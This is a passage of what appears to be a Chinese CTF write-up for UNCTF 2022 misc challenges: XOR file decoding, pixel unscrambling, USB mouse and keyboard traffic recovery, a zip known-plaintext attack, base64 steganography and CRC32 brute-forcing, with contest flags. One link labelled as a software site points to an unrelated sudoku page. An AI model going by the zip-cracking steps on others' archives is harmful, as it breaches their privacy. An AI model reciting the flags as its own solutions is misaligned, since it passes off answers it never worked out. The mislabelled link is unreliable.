alt="Snipaste_2022-11-16_17-57-23"></p><p>这个时候就有人说了，那我没有你的脚本这题咋办呢？？也好办！</p><p>你的电脑肯定有python吧，<code>pip3 install xortool</code>，pip3或者pip都可以，只要你能安装这个库到你的python3上就可以。</p><p>使用<code>xortool.exe -c 00 dat</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203904521.png" alt="image-20221117203904521"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203929800.png" alt="image-20221117203929800"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203947593.png" alt="image-20221117203947593"></p><p>这个<code>0.out</code>打开一看你会发现就是zip的了，这个<code>xortool</code>会自动帮你进行检测然后保存。</p><p><code>-c 00 一般软件或者文件使用， -c 20 一般是文本文件使用</code></p><ol start="3"><li>我当时没有使用xortool，所以我使用010editor对文件进行二进制异或，操作如下：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163232471.png" alt="image-20221117163232471"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163252591.png" alt="image-20221117163252591"></p><p>无符号字节，操作数8e，十六进制，确定。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163318213.png" alt="image-20221117163318213"></p><p>一看就是zip了，修改备注为zip，没有密码，解压得到<code>encode.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"></span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h=flag.size</span><br><span class="line">puzzle=im.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b=flag.getpixel((i,j))</span><br><span class="line">        r=r^g</span><br><span class="line">        g=g^b</span><br><span class="line">        b=b^r</span><br><span class="line">        puzzle.putpixel(((i*<span class="number">787</span>+j)//<span class="number">1200</span>,(i*<span class="number">787</span>+j)%<span class="number">1200</span>),(b,g,r))</span><br><span class="line">puzzle.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure><p>根据加密流程写一个解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bgr.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">            b, g, r = img.getpixel((x, y))</span><br><span class="line">            b = b ^ r</span><br><span class="line">            g = g ^ b</span><br><span class="line">            r = r ^ g</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span> <span class="subst">&#123;g&#125;</span> <span class="subst">&#123;r&#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果你实在不知道为什么要向上面那样写解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是刚刚的加密，解密的脚本</span></span><br><span class="line">r, g, b = <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">r = r ^ g</span><br><span class="line">g = g ^ b</span><br><span class="line">b = b ^ r</span><br><span class="line"><span class="built_in">print</span>(r, g, b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">b = b ^ r</span><br><span class="line">g = g ^ b</span><br><span class="line">r = r ^ g</span><br><span class="line"><span class="built_in">print</span>(r, g, b)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">7 1 2</span><br><span class="line">3 4 5</span><br></pre></td></tr></table></figure><p>所以说有时候加密流程搞不懂，你就写个demo试试。</p><p>运行解密脚本后，会得到一个<code>bgr.txt</code>文件</p><p>运行该脚本之前，手动新建一个<code>images</code>的文件夹，因为我这个脚本会把图片写入的<code>images</code>的文件夹里面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bgr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">img = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    img.append(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), line.split(<span class="string">&quot; &quot;</span>))))</span><br><span class="line">img = np.array(img, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> width, height <span class="keyword">in</span> &#123;<span class="number">1</span>: <span class="number">944400</span>, <span class="number">2</span>: <span class="number">472200</span>, <span class="number">3</span>: <span class="number">314800</span>, <span class="number">4</span>: <span class="number">236100</span>, <span class="number">5</span>: <span class="number">188880</span>, <span class="number">6</span>: <span class="number">157400</span>, <span class="number">8</span>: <span class="number">118050</span>, <span class="number">10</span>: <span class="number">94440</span>, <span class="number">12</span>: <span class="number">78700</span>, <span class="number">15</span>: <span class="number">62960</span>, <span class="number">16</span>: <span class="number">59025</span>, <span class="number">20</span>: <span class="number">47220</span>, <span class="number">24</span>: <span class="number">39350</span>, <span class="number">25</span>: <span class="number">37776</span>, <span class="number">30</span>: <span class="number">31480</span>, <span class="number">40</span>: <span class="number">23610</span>, <span class="number">48</span>: <span class="number">19675</span>, <span class="number">50</span>: <span class="number">18888</span>, <span class="number">60</span>: <span class="number">15740</span>, <span class="number">75</span>: <span class="number">12592</span>, <span class="number">80</span>: <span class="number">11805</span>, <span class="number">100</span>: <span class="number">9444</span>, <span class="number">120</span>: <span class="number">7870</span>, <span class="number">150</span>: <span class="number">6296</span>, <span class="number">200</span>: <span class="number">4722</span>, <span class="number">240</span>: <span class="number">3935</span>, <span class="number">300</span>: <span class="number">3148</span>, <span class="number">400</span>: <span class="number">2361</span>, <span class="number">600</span>: <span class="number">1574</span>, <span class="number">787</span>: <span class="number">1200</span>, <span class="number">1200</span>: <span class="number">787</span>, <span class="number">1574</span>: <span class="number">600</span>, <span class="number">2361</span>: <span class="number">400</span>, <span class="number">3148</span>: <span class="number">300</span>, <span class="number">3935</span>: <span class="number">240</span>, <span class="number">4722</span>: <span class="number">200</span>, <span class="number">6296</span>: <span class="number">150</span>, <span class="number">7870</span>: <span class="number">120</span>, <span class="number">9444</span>: <span class="number">100</span>, <span class="number">11805</span>: <span class="number">80</span>, <span class="number">12592</span>: <span class="number">75</span>, <span class="number">15740</span>: <span class="number">60</span>, <span class="number">18888</span>: <span class="number">50</span>, <span class="number">19675</span>: <span class="number">48</span>, <span class="number">23610</span>: <span class="number">40</span>, <span class="number">31480</span>: <span class="number">30</span>, <span class="number">37776</span>: <span class="number">25</span>, <span class="number">39350</span>: <span class="number">24</span>, <span class="number">47220</span>: <span class="number">20</span>, <span class="number">59025</span>: <span class="number">16</span>, <span class="number">62960</span>: <span class="number">15</span>, <span class="number">78700</span>: <span class="number">12</span>, <span class="number">94440</span>: <span class="number">10</span>, <span class="number">118050</span>: <span class="number">8</span>, <span class="number">157400</span>: <span class="number">6</span>, <span class="number">188880</span>: <span class="number">5</span>, <span class="number">236100</span>: <span class="number">4</span>, <span class="number">314800</span>: <span class="number">3</span>, <span class="number">472200</span>: <span class="number">2</span>&#125;.items():</span><br><span class="line">    img = img.reshape(height, width, <span class="number">3</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./images/<span class="subst">&#123;width&#125;</span>_<span class="subst">&#123;height&#125;</span>.png&quot;</span>, img)</span><br></pre></td></tr></table></figure><p>images目录下面出现了很多的图片了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163804963.png" alt="image-20221117163804963"></p><p>我们肉眼可以看到<code>1200x787.png</code>是一张完美的图片，我们打开后，左转90°，再垂直翻转一下，就得到了flag。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163903056.png" alt="image-20221117163903056"></p><p><strong>UNCTF{93bb442f-2a76-2b6f-c42f-c2297f5fdaf9}</strong></p><p><strong>补充：</strong></p><p>我是如何得到那些宽高的？</p><p><code>bgr.txt</code> 一共有944400个像素点，我们就找能被整除的数，也就是假设一个width，如果944400 % width &#x3D;&#x3D; 0，那你们能被整除，那它们就有可能是真实的宽度和高度。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117195638476.png" alt="image-20221117195638476"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">    N = 61366</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line"><span class="string">    &#123;1: 61366, 2: 30683, 61: 1006, 122: 503, 503: 122, 1006: 61, 30683: 2&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#123;X1: Y1, X2: Y2, ..., Xn: Yn&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入数字&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = args.t</span><br><span class="line">ret = &#123;X: <span class="built_in">int</span>(N / X) <span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N) <span class="keyword">if</span> N % X == <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;一共有 <span class="subst">&#123;<span class="built_in">len</span>(ret)&#125;</span> 种情况:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117195936402.png" alt="image-20221117195936402"></p><br><h1 id="13-CatchJerry-华中科技大学"><a href="#13-CatchJerry-华中科技大学" class="headerlink" title="13.CatchJerry-华中科技大学"></a>13.CatchJerry-华中科技大学</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题干：</span><br><span class="line">Tom和Jerry是一对欢喜冤家，这天Jerry偷走了芝士，Tom需要把他抓回来。</span><br><span class="line">Jerry一会跳到屏幕上，一会跳到键盘上，Tom很是头晕。</span><br><span class="line">你能帮助Tom看清Jerry的踪迹吗？</span><br><span class="line">说明：</span><br><span class="line">flag内容由若干大写英文单词组成，单词间以&quot;_&quot;间隔，flag格式：UNCTF&#123;解出的字符串&#125;</span><br></pre></td></tr></table></figure><ol><li>下载文件后，得到了一个流量包，打开分析了一下基本都是usb流量。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤命令：tshark.exe -r .\CatchJerry.pcapng -Y &quot;usbhid.data&quot; -T fields -e usbhid.data &gt; out.txt</span><br></pre></td></tr></table></figure><p><strong>out.txt:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000</span><br><span class="line">0000010000000100</span><br><span class="line">0000010000000100</span><br><span class="line">0000020000000200</span><br><span class="line">0000010000000100</span><br><span class="line">0000020000000200</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用代码把这个数据转换为鼠标的坐标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keys = f.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;LEFT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> left, <span class="built_in">open</span>(<span class="string">&quot;RIGHT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> right, <span class="built_in">open</span>(<span class="string">&quot;ALL.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> <span class="built_in">all</span>:</span><br><span class="line">    posx, posy = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        x = <span class="built_in">int</span>(line[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(line[<span class="number">5</span>:<span class="number">7</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">127</span>:</span><br><span class="line">            x -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">115</span>:</span><br><span class="line">            y -= <span class="number">256</span></span><br><span class="line">        posx += x</span><br><span class="line">        posy += y</span><br><span class="line">        <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        btn_flag = <span class="built_in">int</span>(line[:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> btn_flag == <span class="number">1</span>:  <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">            left.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> btn_flag == <span class="number">2</span>:</span><br><span class="line">            right.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">all</span>.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到3个文件分别是<code>ALL.TXT</code>, <code>LEFT.txt</code>, <code>RIGHT.txt</code>，<code>RIGHT.txt</code>没有内容，也就是说没有右键的流量。</p><p>复制<code>LEFT.txt</code>到kali中，安装<code>gnuplot</code>，不会安装的百度一下。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117164524693.png" alt="image-20221117164524693"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_10-51-24.png" alt="Snipaste_2022-11-17_10-51-24"></p><p>得到关键字：<code>TOM</code>，<code>JERRY</code>，<code>FRIENDS</code></p><p>根据题干所以还有flag在键盘流量里面，但是我们如果在<code>wireshark</code>中过滤器用<code>usb.capdata</code>，你会发现没有任何流量，所以说键盘的流量也在<code>usbhid.data</code>里面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据 USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节，刚好所有数据都是八字节。</span><br><span class="line">击键信息集中在第3个字节，每次击键都会产生一个数据包。</span><br><span class="line">所以下面的代码就是读取第3个字节，然后输出键盘按键的信息。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    num = <span class="built_in">int</span>(i[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="built_in">print</span>(mappings[num], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117164835273.png" alt="image-20221117164835273"></p><p>得到关键字：<code>AND</code>，<code>BEST</code></p><p>所以flag为：</p><p><strong>UNCTF{TOM_AND_JERRY_BEST_FRIENDS}</strong></p><br><h1 id="14-贝斯家族的侵略-中国地质大学武汉"><a href="#14-贝斯家族的侵略-中国地质大学武汉" class="headerlink" title="14.贝斯家族的侵略-中国地质大学武汉"></a>14.贝斯家族的侵略-中国地质大学武汉</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提示1：如果明文攻击失败，尝试使用bandzip</span><br><span class="line">提示2：会动的鼠标</span><br></pre></td></tr></table></figure><ol><li>使用bandzip，极限压缩然后明文攻击。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/1.%E6%94%BB%E5%87%BBkey.jpg" alt="1.攻击key"></p><p>得到密码：<code>b4s31sN1ce</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/2.%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81.jpg" alt="2.读取密码"></p><ol start="2"><li>解压文件，打开<code>flag</code>的文件</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117192220149.png" alt="image-20221117192220149"></p><p>一堆base64，base64隐写了，用我的软件也可以，因为软件偷懒没写多线程，然后这个base64文本又比较多，所以会出现卡死，但是并不是真的死了，需要稍微等一会，Github链接：<a href="https://github.com/Byxs20/Base64-Tools%EF%BC%8C%E6%89%93%E5%BC%80%E5%90%8E%E5%9C%A8%E5%8F%B3%E8%BE%B9%E7%9A%84Release%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/Byxs20/Base64-Tools，打开后在右边的Release下载。</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117192944355.png" alt="image-20221117192944355"></p><p>复制下面的然后粘贴到CyberChef上面</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_19-32-51.png" alt="Snipaste_2022-11-17_19-32-51"></p><p>然后保存这个文件保存下来</p><p>这个时候，就开始难起来了，<code>Macro</code>翻译是宏，<code>.mrd</code>这个格式找了半天也没找到啥软件。</p><p>不过我的思路就是肯定是一款软件，而且他是鼠标宏的，因为<code>提示2：会动的鼠标</code>，鼠标和宏一起，就是鼠标宏，鼠标宏才会动，鼠标是不会莫名其妙的移动的。</p><p>现在就是必须要找到那款软件。</p><p>最终下载了一款叫<code>MacroRecorder</code>的软件，官网链接：<a href="https://www.dcode.fr/solveur-sudoku">https://www.dcode.fr/solveur-sudoku</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194152595.png" alt="image-20221117194152595"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194244437.png" alt="image-20221117194244437"></p><p>打开<code>Macro.mrd</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194425357.png" alt="image-20221117194425357"></p><p>这个时候打开画图软件，点一下Play</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194459247.png" alt="image-20221117194459247"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194539979.png" alt="image-20221117194539979"></p><p>你的鼠标就会变成移动的鼠标喽~嘎嘎乱动</p><p><strong>UNCTF{b4s3_1s_v3ry_g0od!!}</strong></p><br><h1 id="15-峰回路转-内蒙古警察职业学院"><a href="#15-峰回路转-内蒙古警察职业学院" class="headerlink" title="15.峰回路转-内蒙古警察职业学院"></a>15.峰回路转-内蒙古警察职业学院</h1><p>这个时候距离比赛还有4小时左右，我一觉睡醒，这题0解变成2解，我一看就知道排名掉了，果然20名开外，然后我就硬肝这题了，还好肝出来了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示1：带密码的eye</span><br></pre></td></tr></table></figure><ol><li>这两个文件，肯定是可以crc32爆破的，我用的是我开源项目：<a href="https://github.com/Byxs20/zip-crc-tools">Byxs20&#x2F;zip-crc-tools</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118100047227.png" alt="image-20221118100047227"></p><p>如果使用我的项目的话，需要手动去添加一些字符集，添加字符集，才可被爆破出来，不然爆破不出来；另外这个crc32的项目也是需要手动下载的，详细看我github项目的食用教程！</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118100500353.png" alt="image-20221118100500353"></p><p>配置好后，运行效果如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_11-19-09.png" 